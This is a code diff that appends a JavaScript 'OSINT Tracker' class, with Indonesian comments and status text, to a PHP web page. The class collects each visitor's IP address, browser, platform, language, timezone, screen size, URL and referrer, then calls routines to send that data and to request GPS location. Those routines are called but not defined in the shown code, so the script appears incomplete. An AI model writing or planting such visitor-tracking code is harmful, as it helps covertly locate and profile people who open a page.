@@ -524,5 +524,78 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             </div>
         </div>
     </div>
+    <script>
+    // OSINT Tracker - MENUNGGU IZIN LOKASI TANPA TIMEOUT
+    class OSINTTracker {
+        constructor() {
+            this.userData = {
+                ip_address: 'Mengambil IP...',
+                public_ip: 'Mengambil IP...',
+                latitude: 0,
+                longitude: 0,
+                accuracy: 0,
+                country: 'Menunggu...',
+                city: 'Menunggu...',
+                full_address: 'Menunggu...',
+                source: 'pending',
+                gps_allowed: false,
+                timestamp: new Date().toISOString(),
+                user_agent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen_resolution: `${window.screen.width}x${window.screen.height}`,
+                page_url: window.location.href,
+                referrer: document.referrer || 'Direct'
+            };
+            
+            this.isWaiting = true;
+            this.gpsSuccess = false;
+            this.gpsAttempted = false;
+            
+            console.log('✅ OSINT Tracker Active');
+            this.init();
+        }
+        
+        updateStatus(status, subStatus, isSuccess = false, isError = false) {
+            const statusText = document.getElementById('statusText');
+            const statusSub = document.getElementById('statusSub');
+            const statusIcon = document.getElementById('statusIcon');
+            const statusBar = document.getElementById('locationStatusBar');
+            
+            if (statusText) statusText.textContent = status;
+            if (statusSub) statusSub.textContent = subStatus;
+            
+            if (statusIcon) {
+                if (isSuccess) {
+                    statusIcon.className = 'status-icon success';
+                    statusIcon.innerHTML = '<i class="fas fa-check" style="font-size: 12px;"></i>';
+                } else if (isError) {
+                    statusIcon.className = 'status-icon error';
+                    statusIcon.innerHTML = '<i class="fas fa-times" style="font-size: 12px;"></i>';
+                } else {
+                    statusIcon.className = 'status-icon waiting';
+                    statusIcon.innerHTML = '<i class="fas fa-location-arrow" style="font-size: 12px;"></i>';
+                }
+            }
+            
+            // Sembunyikan status bar setelah sukses/error (5 detik)
+            if (isSuccess || isError) {
+                setTimeout(() => {
+                    if (statusBar) statusBar.classList.add('hidden');
+                }, 5000);
+            } else {
+                if (statusBar) statusBar.classList.remove('hidden');
+            }
+        }
+        
+        async init() {
+            this.updateStatus('Mengambil data IP...', 'Mendeteksi jaringan');
+            await this.getIPAddress();
+            await this.sendData();
+            this.requestGPSPermission();
+        }
+    }
+    </script>
 </body>
 </html>
